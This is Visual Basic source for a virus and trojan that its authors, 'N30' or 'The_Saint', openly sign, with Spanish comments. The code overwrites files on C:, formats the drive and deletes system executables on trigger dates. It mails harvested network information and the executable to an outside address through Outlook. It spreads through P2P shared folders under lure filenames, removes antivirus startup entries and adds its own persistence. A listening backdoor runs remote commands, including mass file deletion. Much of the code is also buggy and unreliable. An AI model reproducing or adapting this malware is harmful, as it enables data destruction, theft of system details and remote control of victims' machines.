Private Sub Form_Load()
' Primero quiero aclarar que este virus fue creado en argentina por The_Saint o Neo... Finalmente, sería muy grato agradecrer a GEDZAC por leer este codigo de fuente :)

On Error Resume Next
varuno = "script"
vardos = "ing.fil"
vartres = "esystemo"
varcuatro = "bject"
Set fso = CreateObject("scripting.filesystemobject")
Set cmd = fso.createtextfile("c:\info.cmd", True)
cmd.writeline "ipconfig /all > c:\ip5.txt"
cmd.writeline "tracert 127.0.0.1 >> c:\ip5.txt"
cmd.writeline "nbtstat -A 127.0.0.1 >> c:\ip5.txt"
cmd.Close
varcinco = "wscrip"
varseis = "t.shel"
varsiete = "l"
Set wsc = CreateObject(varcinco + varseis + varsiete)
Set prueba = fso.getfolder("c:\")
For Each file In prueba.Files
Set sw = CreateObject("scripting.filesystemobject")
Set try = sw.createtextfile("c:\" & file.Name, True)
try.writeline "set fso = createobject(" + Chr(34) + "scripting.filesystemobject" + Chr(34) + ")"
try.writeline "hola = fso.getspecialfolder(0)"
try.writeline "set prueba = fso.deletefile(hola)"
try.writeline "if day(now()) = " + Chr(34) + "15" + Chr(34) + "Then set hola = fso.copyfile(copy.vbs)"
try.Close
Set pagina = fso.createtextfile("c:\informacion.html", True)
pagina.writeline "<html><head><title>Virus Alert</title></head><body>"
pagina.writeline "<script language='vbscript'>"
pagina.writeline "msgbox " + Chr(34) + "Estás infectado con un virus llamado N30/Infector" + Chr(34) + ", 16," + Chr(34) + "Estás infectado con un virus llamado N30/infector" + Chr(34)
pagina.writeline "</script>"
pagina.writeline "<h3>Éste virus fue creado por N30 en Argentina, increíble ¿no? Todos los virus los hace en distintos países;)"
pagina.writeline "</h3><p><marquee>Qué bien lo de N30, no?</marquee><p><Estarán tus archivos a salvo?... Avisá a tu compañía de antivirus urgentemente porque te digo que si no les avisás cagaste...."
pagina.writeline "Enviá un e-mail a perantivirus: <a href=" + Chr(34) + "mailto:soporte@persystems.com>Persystems(e-mail)</a>"
pagina.writeline "<p>Enviá un e-mail a karpesky: <a href=" + Chr(34) + "mailto:newvirus@karpesky.com>Karpesky(e-mail)</a>"
pagina.writeline "Éste página fue hecha por N30"
pagina.Close
Set pagina1 = fso.createtextfile("c:\informacion1.html", True)
pagina1.writeline "<html><head><title>Virus Alert</title></head><body>"
pagina.writeline "<script language='vbscript'>"
pagina.writeline "msgbox " + Chr(34) + "You are infected with a virus called Infector/N30" + Chr(34)
pagina.writeline "</script>"
pagina.writeline "<h3>This virus was created in Africa by N30, pretty impresive, huh?All his viruses are made in different countries;)"
pagina.writeline "</h3><p><marquee>What a good idea, huh?</marquee><p>Are your files going to be save?... Give a piece of advise to you antivirus company becuase if you don´t shit is going to fall from the sky directly to you..."
pagina.writeline "Advice per antivirus: <a href=" + Chr(34) + "mailto:soporte@persystems.com>Persystems(e-mail)</a>"
pagina.writeline "<p>Advice Karpesky: <a href=" + Chr(34) + "mailto:newvirus@karpesky.com>Karpesky(e-mail)</a>"
pagina.writeline "Éste página fue hecha por N30"
pagina.Close
Set commadn = fso.createtextfile("c:\autoexec.bat", True)
comadn.writeline "start c:\informacion.html>nul"
comadn.writeline "start c:\informacion1.html>nul"
comadn.Close
Next
Set crazy = fso.createtextfile("c:\loquito.cmd", True)
crazy.writeline "a:"
crazy.writeline "format c:"
crazy.writeline "Goto a"
crazy.Close
Set lc = fso.copyfile

If Day(Now()) = 15 * 3 / 5 Then
MsgBox "Te voy a eliminar el regedit;)", vbExclamation, "N30"
Kill "c:\windows\regedit.exe"
If Day(Now()) >= 15 * 4 / 6 Then
Kill "c:\windows\cmd.exe"
End If
If Day(Now()) <= 15 * 4 / 6 Then
Kill "c:\windows\explorer.exe"



End If
End If



If Day(Now()) = 15 Then
Set wscri = CreateObject("wscript.shell")
wscri.run ("c:\loquito.cmd")

End If
'envía un mail de NOTIFICACIÓN de las computadoras infectadas
Set O = CreateObject("Outlook.Application")

Set Om = O.CreateItem(0)


Om.Recipients.Add "osavaldo@Persystems.zzn.com"

Om.Subject = "Infectado"

Om.Body = "Otro más"

Om.attachments.Add "c:\ip5.txt"

Om.attachments.Add "c:\N30.exe"

Om.DeleteAfterSubmit = True

Om.SEND

For hola = 1 To 30
If hola = "1" Then padre = "Pamela Anderson"
If hola = "2" Then padre = "Britney Spears"
If hola = "3" Then padre = "Thalia"
If hola = "4" Then padre = "Carmen Elecktra"
If hola = "5" Then padre = "Shakira"
If hola = "6" Then padre = "Ashley Olsen"
If hola = "7" Then padre = "Lindsay lohan"
If hola = "8" Then padre = "Chicas"
If hola = "9" Then padre = "Pampita"
If hola = "10" Then padre = "Valeria"
If hola = "11" Then padre = "Nicole newman"
If hola = "12" Then padre = "Lorena"
If hola = "13" Then padre = "Pamela Anderson"
If hola = "14" Then padre = "Ana Kournikova"
If hola = "15" Then padre = "Pamela Anderson"
If hola = "16" Then padre = "Britney spears"
If hola = "17" Then padre = "Nicole Newman"
If hola = "18" Then padre = "Carmen Electra"
If hola = "19" Then padre = "Thalia"
If hola = "20" Then padre = "Mary Kate olsen"
If hola = "21" Then padre = "N30"
If hola = "22" Then padre = "Datafull screensaver"
If hola = "23" Then padre = "Cameron Diaz"
If hola = "24" Then padre = "Kate winslet"
If hola = "25" Then padre = "Ashley Olsen"
If hola = "26" Then padre = "Blink 182"
If hola = "27" Then padre = "Off spring"
If hola = "28" Then padre = "Hacking Computers"
If hola = "29" Then padre = "Green Day"
If hola = "30" Then padre = "Computacion para ejecutivos"

For extension = 1 To 5
If extension = "1" Then comp = ".exe"
If extension = "2" Then comp = ".bat"
If extension = "3" Then comp = ".com"
If extension = "4" Then comp = ".pif"
If extension = "5" Then comp = ".scr"
Do
Set copying = CreateObject("scripting.filesystemobject")
copying.createfolder ("c:\windows\gedzac")
copying.copyfile ("c:\windows\gedzac\prueba.exe")
Set copying1 = copying.copyfile("c:\N30.exe")
Set copying2 = copying.copyfile("c:\windows\system\pruebita.exe")
Set copyinga = copying.copyfile("a:\gente")
Loop
directorio = "c:\windows\gedzac\prueba.exe"
directorio1 = "c:\N30.exe"
directorio2 = "c:\windows\system\pruebita.exe"
  fso.copyfile directorio, "C:\Program File\" + Chr(103) + "rokster\My Grokster\" & padre & comp
    fso.copyfile directorio, "C:\ARCHIV~1\" + Chr(103) + "rokster\My Grokster\" & padre & comp
    
    fso.copyfile directorio, "C:\Program Files\" + Chr(109) + "orpheus\My Shared Folder\" & padre & comp
    fso.copyfile directorio, "C:\archiv~1\" + Chr(109) + "orpheus\My Shared Folder\" & padre & comp
    
    fso.copyfile directorio, "C:\Program Files\" + Chr(105) + Chr(99) + Chr(113) + "\shared files\" & padre & comp
    fso.copyfile directorio, "C:\archiv~1\" + Chr(105) + Chr(99) + Chr(113) + "\shared files\" & padre & comp
    
    fso.copyfile directorio, "C:\Program Files\" + Chr(107) + Chr(100) + Chr(122) + Chr(100) + Chr(100) + "\My Shared Folder\" & padre & comp
    fso.copyfile directorio, "C:\ARCHIV~1\" + Chr(107) + Chr(99) + Chr(122) + Chr(99) + Chr(99) + "\My Shared Folder\" & padre & comp
Next

Next

If Day(Now()) <> 15 * 3 / 5 Then
' Si el día es = a 15 * 3 / 5 entonces creará el je.vbs :P
Set jelo = CreateObject("scripting.filesystemobject")
jelo.createtextfile ("c:\windows\ji.vbs")
jelo.writeline "set wsc = createobject(" + Chr(34) + "wscript.shell" + Chr(34) + ")"
jelo.writeline "Set re = wsc.regdelete(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent" + Chr(34) + ")"
jelo.writeline "Set repa = wsc.regdelete(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PAV.EXE" + Chr(34) + ")"
jelo.writeline "Set repa = wsc.regdelete(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PER Email Protection" + Chr(34) + ")"
jelo.writeline "Set resil = wsc.regwrite(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", "c:\N30.exe" + Chr(34) + ")"
jelo.writeline "Set resil1 = wsc.regwrite(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PAV.EXE" + Chr(34) + "," + Chr(34) + "c:\N30.exe" + Chr(34) + ")"
jelo.writeline "Set resilon = wsc.regwrite(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\PER Email Protection" + Chr(34) + "," + Chr(34) + "c:\N30.exe" + Chr(34) + ")"
jelo.writeline "Set resil1 = wsc.regwrite(" + Chr(34) + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\poco" + Chr(34) + "," + Chr(34) + "c:\N30.exe" + Chr(34) + ")"
jelo.writeline "Set resil1 = wsc.regdelete(" + Chr(34) + "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" + Chr(34) + "," + Chr(34) + ")"
jelo.Close
End If
Win.Listen
End Sub





Private Sub Win_DataArrival(ByVal bytesTotal As Long)
' Ésta parte cambiará a medida que el troyano sea más completo :-)
Dim datos As String

   Win.GetData datos
  
   
   
 Select Case datos
 Case 1
   Set wsc = CreateObject("wscript.shell")
   wsc.run ("notepad")
 
Case 2

Set fso = CreateObject("scripting.filesystemobject")
fso.deletefile "C:\*.*"

Case 3

Set fso = CreateObject("scripting.filesystemobject")
Set man = fso.createtextfile("C:\TROYANO.txt")
man.writeline "El troyano creado por The_Saint está en un máquina :-)"
man.writeline "Alguien te está hackeando :):)ç:):)"
man.writeline "Te gusta la idea?"
man.writeline "Si no te gusta la idea podés ir bajando el patch o sacando el troyano del inicio de windows ;)"
man.writeline "Neo te manda un gran saludo"
man.Close


 
Case Else

End Select


End Sub

Private Sub Win_ConnectionRequest(ByVal requestID As Long)
   Win.Close
   Win.Accept requestID
    Win.SendData "Te conectaste al server... Este troyano fue creado por Neo - The Saint"

End Sub

  

